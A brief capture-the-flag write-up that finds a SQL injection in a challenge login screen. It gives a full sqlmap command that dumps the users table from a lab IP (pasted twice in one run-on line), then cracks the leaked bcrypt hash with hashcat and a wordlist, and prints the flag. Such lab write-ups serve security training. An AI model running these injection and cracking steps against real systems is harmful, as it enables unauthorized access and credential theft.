# Description

Your faction must infiltrate the KORP™ terminal and gain access to the Legionaries' privileged information and find out more about the organizers of the Fray. The terminal login screen is protected by state-of-the-art encryption and security protocols.

# Solution

Typing in something like "admin'" for the username shows us that there's a SQL injection vulnerability. Running SQL map against it `sqlmap --url http://94.237.55.246:47667/ --data 'username=admin&password=admin' --ignore-code 401 -v 6 --dump -T usersqlmap --url http://94.237.55.246:47667/ --data 'username=admin&password=admin' --ignore-code 401 -v 6 --dump -T users` 

Gives us a username and hashed password `admin:$2b$12$OF1QqLVkMFUwJrl1J1YG9u6FdAQZa6ByxFt/CkS/2HW8GA563yiv.`. 

We can crack the hash easily giving us a password of Password123 `hashcat hash.txt --wordlist /usr/share/wordlists/rockyou.txt -m 3200` 

Entering the password into the site gives the flag HTB{t3rm1n4l_cr4ck1ng_sh3n4nig4n5}